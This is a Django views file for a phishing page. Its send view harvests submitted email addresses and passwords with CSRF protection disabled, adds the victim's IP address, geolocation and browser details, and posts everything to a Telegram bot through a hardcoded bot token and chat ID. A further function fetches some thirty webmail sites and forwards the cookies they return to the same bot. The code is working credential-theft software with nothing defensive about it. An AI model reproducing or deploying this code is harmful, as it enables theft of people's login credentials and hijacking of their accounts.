from django.shortcuts import render
import requests
import re
from django.views.decorators.csrf import csrf_exempt
from telegram import Bot
import requests
from telegram import Update, Bot
from telegram.ext import CommandHandler, Updater
import queue

from user_agents import parse

# Create your views here.
def index(request):
    return render(request, 'index.html')

@csrf_exempt
def send(request):
    email = request.POST.get('emp')
    password = request.POST.get('pass')

    ip = get_client_ip(request)
    ip_info = get_ip_info(ip)
    OS = my_view(request)
    print(email)
    print(password)
    TeleBot(f"Email: {email}\nPassword: {password}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
    cookie()

    return render(request, 'index.html')

def parse_user_agent(user_agent_string):
    # Extract WebKit information
    webkit_match = re.search(r'AppleWebKit/([\d.]+)', user_agent_string)
    webkit_version = webkit_match.group(1) if webkit_match else 'Unknown'

    # Extract browser and OS information
    browser_match = re.search(r'(Firefox|Chrome|Safari|Opera|MSIE|Trident)/([\d.]+)', user_agent_string)
    browser_info = browser_match.groups() if browser_match else ('Unknown', 'Unknown')

    os_match = re.search(r'\(([^)]+)\)', user_agent_string)
    os_info = os_match.group(1) if os_match else 'Unknown'

    return {
        'browser': browser_info[0],
        'browser_version': browser_info[1],
        'webkit_version': webkit_version,
        'os_info': os_info,
    }


def my_view(request):
    user_agent_string = request.META.get('HTTP_USER_AGENT', '')
    user_agent = parse(user_agent_string)
    details = parse_user_agent(user_agent_string)
    
    # Extract details
    browser_family = user_agent.browser.family
    browser_version = user_agent.browser.version_string
    os_family = user_agent.os.family
    os_version = user_agent.os.version_string
    is_mobile = user_agent.is_mobile
    is_tablet = user_agent.is_tablet
    is_touch_capable = user_agent.is_touch_capable
    is_pc = user_agent.is_pc

    
    
    # Construct a response with the extracted details
    response = (
        f'Browser: {browser_family} {browser_version}\n'
        f'Operating System: {details["os_info"]}\n'
        f'Is Mobile: {is_mobile}\n'
        f'Is Tablet: {is_tablet}\n'
        f'Is Touch Capable: {is_touch_capable}\n'
        f'Is PC: {is_pc}\n'
        f'AppleWebKit Version: {details["webkit_version"]}\n'
    )
    
    return response

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        # If the 'HTTP_X_FORWARDED_FOR' header exists, it might be a comma-separated list of IPs.
        ip = x_forwarded_for.split(',')[0]
    else:
        # Fallback to 'REMOTE_ADDR' if 'HTTP_X_FORWARDED_FOR' is not present.
        ip = request.META.get('REMOTE_ADDR')
    return ip

def get_ip_info(ip_address):
    response = requests.get(f'https://ipinfo.io/{ip_address}/json')
    return response.json()

def TeleBot(message):
    # Replace 'YOUR_API_TOKEN' with your actual bot token
    bot = Bot(token='7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I')

    # Replace 'CHAT_ID' with the chat ID where you want to send the message
    chat_id = '1428483523'

    

    # Replace 'YOUR_API_TOKEN' with your actual bot token
    api_token = '7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I'
    #bot.send_message(chat_id=chat_id, text=message)
    # Send a message
    url = f'https://api.telegram.org/bot{api_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(url, data=params)
    except:
        print("Connection Error")


    def start(update, context):
        pass

    def main():
        try:
            updater = Updater('7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I', queue.Queue())
            dp = updater.dispatcher
            dp.add_handler(CommandHandler("start", start))
            updater.start_polling()
            updater.shutdown()
        except:
            print("Message not Sent")


    if __name__ == '__main__':
        main()

def cookie():
    url = [
        "gmail.com",       # Google
        "yahoo.com",        # Yahoo
        "outlook.com",      # Microsoft
        "hotmail.com",      # Microsoft
        "aol.com",          # AOL
        "mail.com",         # 1&1 Mail
        "icloud.com",       # Apple
        "zoho.com",         # Zoho
        "protonmail.com",   # ProtonMail
        "tutanota.com",     # Tutanota
        "yandex.com",       # Yandex
        "mail.ru",          # Mail.ru
        "gmx.com",          # GMX
        "inbox.com",        # Inbox
        "fastmail.com",     # FastMail
        "hushmail.com",     # Hushmail
        "runbox.com",       # Runbox
        "posteo.de",        # Posteo
        "lavabit.com",      # Lavabit
        "countermail.com",  # CounterMail
        "mailfence.com",    # Mailfence
        "startmail.com",    # StartMail
        "ukr.net",          # UkrNet
        "126.com",          # 126 Mail
        "163.com",          # 163 Mail
        "qq.com",           # QQ Mail
        "sina.com",         # Sina Mail
        "sohu.com",         # Sohu Mail
        "webmail.co.za",    # Webmail.co.za
        "broadband.com",    # Broadband Mail
        "blueyonder.co.uk", # Blueyonder
        "sky.com",          # Sky Mail
        "virginmedia.com"   # Virgin Media
    ]


    for link in url:
        try:
            response = requests.get(f"https://{link}")
            cookies = response.cookies
            for cookie in cookies:
                TeleBot(f"Cookie for {link}\nName: {cookie.name}\nValue: {cookie.value}\n================================")
        except:
            print("connection timedout or invalid url")